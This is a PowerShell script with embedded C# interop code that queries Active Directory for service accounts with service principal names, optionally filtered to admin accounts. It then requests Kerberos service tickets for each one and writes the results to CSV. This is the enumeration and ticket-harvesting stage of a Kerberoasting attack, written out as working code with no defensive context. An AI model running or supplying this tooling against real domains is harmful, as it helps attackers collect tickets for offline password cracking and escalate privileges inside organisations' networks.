# STEP 1: Load C# class to get Kerberos TGS tickets
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class K {
    [DllImport("secur32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern int AcquireCredentialsHandle(
        string pszPrincipal,
        string pszPackage,
        uint fCredentialUse,
        IntPtr pvLogonID,
        IntPtr pAuthData,
        IntPtr pGetKeyFn,
        IntPtr pvGetKeyArgument,
        out IntPtr phCredential,
        out IntPtr ptsExpiry);

    [DllImport("secur32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern int InitializeSecurityContext(
        IntPtr phCredential,
        IntPtr phContext,
        string pszTargetName,
        uint fContextReq,
        uint Reserved1,
        uint TargetDataRep,
        IntPtr pInput,
        uint Reserved2,
        out IntPtr phNewContext,
        out SecBufferDesc pOutput,
        out uint pfContextAttr,
        out IntPtr ptsExpiry);

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int FreeCredentialsHandle(IntPtr phCredential);

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int FreeContextBuffer(IntPtr pvContextBuffer);

    [StructLayout(LayoutKind.Sequential)]
    public struct SecBuffer {
        public uint cbBuffer;
        public uint BufferType;
        public IntPtr pvBuffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SecBufferDesc {
        public uint ulVersion;
        public uint cBuffers;
        public IntPtr pBuffers;
    }

    public static string GetTicket(string spn) {
        IntPtr cred = IntPtr.Zero;
        IntPtr ctx = IntPtr.Zero;
        IntPtr expiry1 = IntPtr.Zero;
        IntPtr expiry2 = IntPtr.Zero;
        IntPtr bufPtr = IntPtr.Zero;
        uint attr = 0;

        SecBuffer secBuf = new SecBuffer();
        secBuf.BufferType = 2;
        secBuf.cbBuffer = 0;
        secBuf.pvBuffer = IntPtr.Zero;

        try {
            bufPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(SecBuffer)));
            Marshal.StructureToPtr(secBuf, bufPtr, false);

            SecBufferDesc desc = new SecBufferDesc();
            desc.ulVersion = 0;
            desc.cBuffers = 1;
            desc.pBuffers = bufPtr;

            if (AcquireCredentialsHandle(null, "Kerberos", 0x00000002, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out cred, out expiry1) != 0)
                return "";

            if (InitializeSecurityContext(cred, IntPtr.Zero, spn, 0x00001000, 0, 16, IntPtr.Zero, 0, out ctx, out desc, out attr, out expiry2) != 0)
                return "";

            SecBuffer resultBuf = (SecBuffer)Marshal.PtrToStructure(desc.pBuffers, typeof(SecBuffer));
            if (resultBuf.cbBuffer == 0 || resultBuf.pvBuffer == IntPtr.Zero)
                return "";

            byte[] data = new byte[resultBuf.cbBuffer];
            Marshal.Copy(resultBuf.pvBuffer, data, 0, data.Length);
            return BitConverter.ToString(data).Replace("-", "");
        } finally {
            if (cred != IntPtr.Zero) FreeCredentialsHandle(cred);
            if (bufPtr != IntPtr.Zero) {
                try {
                    SecBuffer cleanup = (SecBuffer)Marshal.PtrToStructure(bufPtr, typeof(SecBuffer));
                    if (cleanup.pvBuffer != IntPtr.Zero) FreeContextBuffer(cleanup.pvBuffer);
                } catch { }
                Marshal.FreeHGlobal(bufPtr);
            }
        }
    }
}
"@

# STEP 2: Query AD for service accounts with SPNs
function Get-AdServiceAccountsV2 {
    [CmdletBinding()]
    Param(
        [string[]] $Identity,
        [switch]   $AdminsOnly,
        [string]   $Domain,
        [string]   $LdapFilter,
        [string]   $Scope = 'Subtree',
        [int]      $PageSize = 200,
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    $dnsDomain = if ($Domain) { $Domain } else { $env:USERDNSDOMAIN }
    if (-not $dnsDomain) { throw "Could not resolve DNS domain. Provide -Domain." }
    $baseDn = "DC=$($dnsDomain -replace '\.',',DC=')"
    $ldapPath = "LDAP://$baseDn"

    $de = if ($Credential -eq [Management.Automation.PSCredential]::Empty) {
        New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
    } else {
        New-Object System.DirectoryServices.DirectoryEntry($ldapPath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
    }

    $idOr = ''
    if ($Identity) {
        foreach ($n in $Identity) {
            if ($n -match '^S-1-')      { $idOr += "(objectSid=$n)" }
            elseif ($n -match '^CN=')   { $idOr += "(distinguishedName=$n)" }
            elseif ($n -match '^[0-9a-fA-F-]{32,}$') { $idOr += "(objectGuid=$n)" }
            else                        { $idOr += "(sAMAccountName=$n)" }
        }
        if ($idOr) { $idOr = "(|$idOr)" }
    }

    $filter  = "(&(samAccountType=805306368)(servicePrincipalName=*)"
    if ($idOr)      { $filter += $idOr }
    if ($AdminsOnly){ $filter += "(adminCount=1)" }
    if ($LdapFilter){ $filter += $LdapFilter }
    $filter += ")"

    $ds = New-Object System.DirectoryServices.DirectorySearcher($de)
    $ds.PageSize     = $PageSize
    $ds.SearchScope  = $Scope
    $ds.CacheResults = $false
    $ds.Filter       = $filter

    $props = @('distinguishedName','sAMAccountName','servicePrincipalName','objectSid','objectGuid','pwdLastSet','lastLogonTimestamp','userPrincipalName','memberOf')
    foreach ($p in $props) { [void]$ds.PropertiesToLoad.Add($p) }

    try {
        $results = $ds.FindAll()
        foreach ($r in $results) {
            $z = $r.Properties
            $obj = New-Object PSObject
            $obj | Add-Member NoteProperty SamAccountName        ($z['samaccountname'][0])
            $obj | Add-Member NoteProperty DistinguishedName     ($z['distinguishedname'][0])
            $obj | Add-Member NoteProperty UserPrincipalName     ($z['userprincipalname'][0])
            $obj | Add-Member NoteProperty ServicePrincipalName  ($z['serviceprincipalname'])

            if ($z['objectsid']) {
                $obj | Add-Member NoteProperty ObjectSid (New-Object System.Security.Principal.SecurityIdentifier($z['objectsid'][0],0)).Value
            }
            if ($z['objectguid']) {
                $guid = New-Object Guid (,$z['objectguid'][0])
                $obj | Add-Member NoteProperty ObjectGuid $guid.Guid
            }
            if ($z['pwdlastset']) {
                $obj | Add-Member NoteProperty PwdLastSet ([datetime]::FromFileTime([int64]$z['pwdlastset'][0]))
            }
            if ($z['lastlogontimestamp']) {
                $obj | Add-Member NoteProperty LastLogonTimestamp ([datetime]::FromFileTime([int64]$z['lastlogontimestamp'][0]))
            }

            $obj
        }
    } finally {
        if ($ds) { $ds.Dispose() }
        if ($de) { $de.Dispose() }
        if ($results) { $results.Dispose() }
    }
}

# STEP 3: Request TGS tickets for all SPNs
function Get-KerberosTicketsForAllSPNs {
    [CmdletBinding()]
    Param(
        [switch]$OnlySuccess,
        [switch]$ExportToCsv,
        [string]$CsvPath = ".\kerberos_tickets.csv",
        [string]$Domain,
        [string]$Scope = "Subtree"
    )

    $accounts = Get-AdServiceAccountsV2 -Domain:$Domain -Scope:$Scope
    $results = @()

    foreach ($acct in $accounts) {
        $sam = $acct.SamAccountName
        $dn  = $acct.DistinguishedName
        $spns = $acct.ServicePrincipalName

        foreach ($spn in $spns) {
            try {
                Write-Host "Requesting TGS for SPN: $spn" -ForegroundColor Cyan
                $ticket = [K]::GetTicket($spn)

                $result = [PSCustomObject]@{
                    SamAccountName     = $sam
                    DistinguishedName  = $dn
                    SPN                = $spn
                    GotTicket          = $false
                    TicketPreview      = ''
                }

                if ($ticket -and $ticket.Length -gt 0) {
                    $result.GotTicket = $true
                    $result.TicketPreview = $ticket.Substring(0, 48) + '...'
                    Write-Host "[+] Success: $spn" -ForegroundColor Green
                } else {
                    Write-Host "[-] Failed : $spn" -ForegroundColor DarkGray
                }

                if (-not $OnlySuccess -or $result.GotTicket) {
                    $results += $result
                }

            } catch {
                Write-Warning "Exception for SPN $spn: $_"
            }
        }
    }

    if ($ExportToCsv) {
        try {
            $results | Export-Csv -NoTypeInformation -Encoding UTF8 -Path $CsvPath
            Write-Host "`n[+] Exported to $CsvPath" -ForegroundColor Yellow
        } catch {
            Write-Warning "Failed to export results: $_"
        }
    }

    return $results
}
